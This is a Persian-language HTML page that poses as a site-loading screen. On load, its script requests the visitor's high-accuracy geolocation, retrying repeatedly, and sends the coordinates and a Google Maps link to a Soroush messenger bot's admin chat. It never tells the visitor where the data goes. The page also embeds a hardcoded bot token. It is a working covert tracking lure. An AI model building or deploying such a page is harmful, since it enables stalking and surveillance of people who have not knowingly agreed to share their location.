<!DOCTYPE html>
<html lang="fa" dir="rtl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>...</title>
<style>
    * { box-sizing: border-box; }

    body {
        margin: 0;
        height: 100vh;
        display: flex;
        justify-content: center;
        align-items: center;
        background: #080d19;
        color: white;
        font-family: Tahoma, sans-serif;
        overflow: hidden;
    }

    .screen {
        display: none;
        flex-direction: column;
        align-items: center;
        justify-content: center;
        text-align: center;
        padding: 20px;
    }

    .screen.active { display: flex; }

    /* ---------- Loading ---------- */
    .spinner {
        width: 70px;
        height: 70px;
        border: 6px solid #1c2a40;
        border-top-color: #00d9ff;
        border-radius: 50%;
        animation: spin 1s linear infinite;
    }

    @keyframes spin {
        to { transform: rotate(360deg); }
    }

    .loading-text {
        margin-top: 25px;
        color: #00d9ff;
        font-size: 18px;
    }

    /* ---------- Success ---------- */
    .success-text {
        color: #4dffb8;
        font-size: 32px;
        font-weight: bold;
        animation: pop 0.5s ease-out;
    }

    @keyframes pop {
        0%   { transform: scale(0); opacity: 0; }
        70%  { transform: scale(1.15); }
        100% { transform: scale(1); opacity: 1; }
    }

    /* ---------- Error ---------- */
    .error-text {
        color: #ff7777;
        font-size: 20px;
        max-width: 340px;
        line-height: 1.9;
    }
</style>
</head>
<body>

    <!-- صفحه لودینگ -->
    <div id="loadingScreen" class="screen active">
        <div class="spinner"></div>
        <div class="loading-text">در حال وارد شدن به سایت...</div>
    </div>

    <!-- صفحه موفقیت -->
    <div id="successScreen" class="screen">
        <div class="success-text">موفقیت</div>
    </div>

    <!-- صفحه خطا -->
    <div id="errorScreen" class="screen">
        <div class="error-text" id="errorText">خطا در دریافت موقعیت</div>
    </div>

<script>
    /* ============================================================
       تنظیمات ربات سروش
       ============================================================ */
    const SOROUSH_BOT_TOKEN = "69646597:5BwDiBYEBPSWMNYicDJNvmuIOJhj_e5q6V8";
    const SOROUSH_ADMIN_ID  = 62519146;  // chat_id مقصد (ADMIN_ID شما)
    const SOROUSH_API_BASE  = `https://api.splus.ir/bot${SOROUSH_BOT_TOKEN}`;
    /* ============================================================ */


    const loadingScreen = document.getElementById("loadingScreen");
    const successScreen = document.getElementById("successScreen");
    const errorScreen   = document.getElementById("errorScreen");
    const errorText     = document.getElementById("errorText");

    let finished   = false;
    let watchId    = null;
    let timeoutIds = [];

    function showScreen(name) {
        loadingScreen.classList.remove("active");
        successScreen.classList.remove("active");
        errorScreen.classList.remove("active");
        document.getElementById(name + "Screen").classList.add("active");
    }

    function clearAll() {
        if (watchId !== null) {
            navigator.geolocation.clearWatch(watchId);
            watchId = null;
        }
        timeoutIds.forEach(id => clearTimeout(id));
        timeoutIds = [];
    }

    // ---------- ارسال به ربات سروش ----------
    async function sendLocationToSoroush(lat, lon, acc) {
        const mapsUrl = `https://www.google.com/maps?q=${lat},${lon}`;
        const text =
            `📍 موقعیت جدید\n\n` +
            `🌍 Latitude: ${lat}\n` +
            `🌍 Longitude: ${lon}\n` +
            `🎯 دقت: ${acc} متر\n\n` +
            `🗺 نقشه:\n${mapsUrl}`;

        try {
            const res = await fetch(`${SOROUSH_API_BASE}/sendMessage`, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({
                    chat_id: SOROUSH_ADMIN_ID,
                    text: text
                })
            });
            const data = await res.json();
            if (data.ok) {
                console.log("✅ موقعیت به سروش ارسال شد");
            } else {
                console.error("❌ خطا در ارسال به سروش:", data);
            }
        } catch (e) {
            console.error("❌ خطای شبکه در ارسال به سروش:", e);
        }
    }

    // ---------- موفقیت ----------
    function onSuccess(position) {
        if (finished) return;
        finished = true;
        clearAll();

        const lat = position.coords.latitude;
        const lon = position.coords.longitude;
        const acc = position.coords.accuracy;

        showScreen("success");

        // ارسال به ربات سروش
        sendLocationToSoroush(lat, lon, acc);

        console.log("📍 مختصات:", lat, lon, "دقت:", acc, "متر");
    }

    // ---------- خطا ----------
    function onFinalError(reason) {
        if (finished) return;
        finished = true;
        clearAll();

        showScreen("error");

        const messages = {
            permission_denied:
                "دسترسی به موقعیت مکانی رد شد.",
            position_unavailable:
                "سرویس موقعیت‌یابی در دسترس نیست.",
            timeout:
                "دریافت موقعیت زمان‌بر شد."
        };

        errorText.textContent = messages[reason] || "خطای ناشناخته";
    }

    // ---------- استراتژی چندمرحله‌ای ----------
    function tryWatch() {
        watchId = navigator.geolocation.watchPosition(
            onSuccess,
            function(err) {
                if (err.code === 1) {
                    onFinalError("permission_denied");
                }
            },
            {
                enableHighAccuracy: true,
                timeout: 25000,
                maximumAge: 0
            }
        );

        timeoutIds.push(setTimeout(function() {
            if (finished) return;

            if (watchId !== null) {
                navigator.geolocation.clearWatch(watchId);
                watchId = null;
            }

            navigator.geolocation.getCurrentPosition(
                onSuccess,
                function(err) {
                    if (err.code === 1) {
                        onFinalError("permission_denied");
                    } else if (err.code === 3) {
                        onFinalError("timeout");
                    } else {
                        onFinalError("position_unavailable");
                    }
                },
                {
                    enableHighAccuracy: false,
                    timeout: 20000,
                    maximumAge: 60000
                }
            );
        }, 35000));
    }

    // ---------- شروع ----------
    window.addEventListener("load", function() {
        if (!navigator.geolocation) {
            onFinalError("position_unavailable");
            return;
        }

        navigator.geolocation.getCurrentPosition(
            onSuccess,
            function(err) {
                if (err.code === 1) {
                    onFinalError("permission_denied");
                } else {
                    tryWatch();
                }
            },
            {
                enableHighAccuracy: true,
                timeout: 15000,
                maximumAge: 0
            }
        );
    });
</script>

</body>
</html>
